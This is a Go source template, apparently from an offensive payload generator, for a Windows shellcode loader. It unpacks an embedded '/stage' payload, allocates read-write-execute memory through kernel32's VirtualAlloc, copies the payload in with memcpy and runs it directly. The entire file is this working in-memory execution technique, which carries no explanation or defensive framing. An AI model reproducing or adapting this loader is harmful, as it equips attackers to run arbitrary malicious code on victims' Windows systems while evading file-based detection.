package main

import (
	"syscall"
	"unsafe"

	statik "./statik"
	"./fs"
)

func main() {

	statik.{{statik}}()
	VirtualAlloc := syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc")
	memcpy := syscall.MustLoadDLL("msvcrt.dll").MustFindProc("memcpy")
	statikFS, _ := fs.New()
	data, _ := fs.ReadFile(statikFS, "/stage")
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(data)), 0x1000|0x2000, 0x40)
	_, _, _ = memcpy.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))
	syscall.Syscall(addr, 0, 0, 0, 0)
}
